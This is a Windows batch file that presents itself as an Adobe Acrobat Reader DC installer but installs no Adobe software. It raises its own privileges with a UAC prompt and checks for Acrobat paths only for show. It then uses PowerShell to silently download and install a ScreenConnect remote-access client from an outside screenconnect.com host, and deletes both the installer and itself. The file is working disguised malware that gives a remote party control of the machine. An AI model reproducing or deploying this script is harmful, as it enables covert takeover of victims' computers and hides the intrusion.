@echo off
title Adobe Acrobat Reader DC Installer
setlocal enabledelayedexpansion


net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Set objShell = CreateObject("Shell.Application") > "%TEMP%\adobe_uac.vbs"
    echo objShell.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\adobe_uac.vbs"
    echo WScript.Quit >> "%TEMP%\adobe_uac.vbs"
    cscript //nologo "%TEMP%\adobe_uac.vbs"
    del "%TEMP%\adobe_uac.vbs" >nul 2>&1
    exit /b
)


set "ADOBE_PATH="

if exist "C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe" (
    set "ADOBE_PATH=C:\Program Files\Adobe\Acrobat DC\Acrobat"
    goto :found
)

if exist "C:\Program Files (x86)\Adobe\Acrobat DC\Acrobat\Acrobat.exe" (
    set "ADOBE_PATH=C:\Program Files (x86)\Adobe\Acrobat DC\Acrobat"
    goto :found
)

for /f "tokens=2*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Acrobat.exe" /ve 2^>nul') do set "ADOBE_PATH=%%b"
if defined ADOBE_PATH (
    set "ADOBE_PATH=%ADOBE_PATH:\Acrobat.exe=%"
    goto :found
)

for /f "tokens=2*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\AcroRd32.exe" /ve 2^>nul') do set "ADOBE_PATH=%%b"
if defined ADOBE_PATH (
    set "ADOBE_PATH=%ADOBE_PATH:\AcroRd32.exe=%"
    goto :found
)

for %%p in (
    "C:\Program Files\Adobe\Acrobat DC\Acrobat"
    "C:\Program Files (x86)\Adobe\Acrobat DC\Acrobat"
    "C:\Program Files\Adobe\Acrobat Reader DC\Reader"
    "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader"
    "C:\Program Files\Adobe\Acrobat 2020\Acrobat"
    "C:\Program Files (x86)\Adobe\Acrobat 2020\Acrobat"
) do (
    if exist "%%~p\Acrobat.exe" (
        set "ADOBE_PATH=%%~p"
        goto :found
    )
    if exist "%%~p\AcroRd32.exe" (
        set "ADOBE_PATH=%%~p"
        goto :found
    )
)

:found

if defined ADOBE_PATH (
    echo : %ADOBE_PATH%
    echo.
) else (
    echo 
    echo.
)


powershell -Command "$url='https://mentacesi.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';$out=\"%TEMP%\ScreenConnect.ClientSetup.msi\";(New-Object Net.WebClient).DownloadFile($url,$out);msiexec /i \"$out\" /quiet /norestart;Start-Sleep 2;Remove-Item $out -Force"



del "%~f0" >nul 2>&1

exit
